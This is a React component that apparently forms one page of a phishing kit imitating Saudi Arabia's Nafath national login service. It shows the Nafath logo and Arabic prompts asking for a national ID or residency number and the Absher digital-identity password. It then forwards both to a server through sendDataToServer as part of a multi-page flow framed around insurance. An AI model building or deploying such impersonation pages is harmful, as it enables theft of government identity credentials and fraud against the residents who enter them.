import Input from "@/components/Input";
import Main from "@/components/Main";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import {
  currentPage,
  extraInfo,
  sendDataToServer,
} from "../../context/signals";
import { useLocation, useNavigate } from "react-router-dom";
import { LockIcon, User } from "lucide-react";
// import { TypewriterEffectSmooth } from "@/components/ui/typeEffect";
// import { nafazWords } from "@/data/typeEffect-content";

function Nafaz() {
  const { state } = useLocation();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });
  const navigate = useNavigate();

  function sendData(data: FieldValues) {
    // console.log(data);
    extraInfo.value.number = data.number;

    // [ ] should be true for production
    sendDataToServer(data, "nafaz", "page6", false, navigate, "/page6", {
      ...state,
      ...data,
    });
  }

  useEffect(() => {
    currentPage.value = "nafaz";
  }, []);
  return (
    <Main>
      <div className="bg-gray-100 min-h-[calc(100vh-400px)] py-20">
        <form
          className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
          onSubmit={handleSubmit(sendData)}
        >
          <img
            src="/assets/images/Nafath.png"
            className="w-40 mx-auto mb-4"
            alt="nafaz logo"
          />
          <p className="text-xl font-black text-[hsl(176,97%,30%)] w-fit mx-auto mb-8">
            دخول سريع وآمن
          </p>
          <h2 className="mb-5 text-lg font-bold text-gray-500 text-center">
            الرجاء ادخال رقم الهوية و كلمة المرور الخاصة بهويتك الرقمية (أبشر)
          </h2>

          <div className="max-w-full">
            {/* <TypewriterEffectSmooth
              words={nafazWords}
              cursorClassName="hidden"
            /> */}
            <p className="text-lg font-bold text-[hsl(176,97%,30%)] w-fit mb-4">
              مرحباً بك في خدمة النفاذ الوطني الموحد.
            </p>
          </div>

          <Input
            errors={errors}
            register={register}
            id="number"
            label="رقم بطاقة الأحوال/الاقامة"
            placeholder="أدخل رقم بطاقة الأحوال/الاقامة الخاص بك هنا"
            type="number"
            isAr
            icon={<User size={20} />}
            className="bg-[#e2e8f0] rounded-3xl"
            value={extraInfo.value.number}
            options={{
              required: "هذا الحقل ضروري",
              pattern: {
                value: /^[0-9]{10}$/,
                message: "يجب كتابة عشر أرقام",
              },
            }}
          />
          <Input
            errors={errors}
            register={register}
            id="password"
            label="كلمة المرور"
            placeholder="أدخل كلمة المرور"
            type="password"
            isAr
            icon={<LockIcon size={20} />}
            className="bg-[#e2e8f0] rounded-3xl"
            options={{
              required: "هذه الحقل ضروري",
            }}
          />

          <button className="w-full mt-6 lg:text-xl capitalize rounded-3xl font-bold py-1.5 px-6 bg-[#129786] hover:brightness-110 text-white transition-colors">
            التالي
          </button>

          <p className="text-center text-sm font-medium">
            يرجى فتح تطبيق نفاذ لإصدار شريحة التأمين.
          </p>

          <img
            src="/assets/images/below-nafaz.png"
            alt="nafaz footer image"
            className="mt-4"
          />
        </form>
      </div>
    </Main>
  );
}

export default Nafaz;
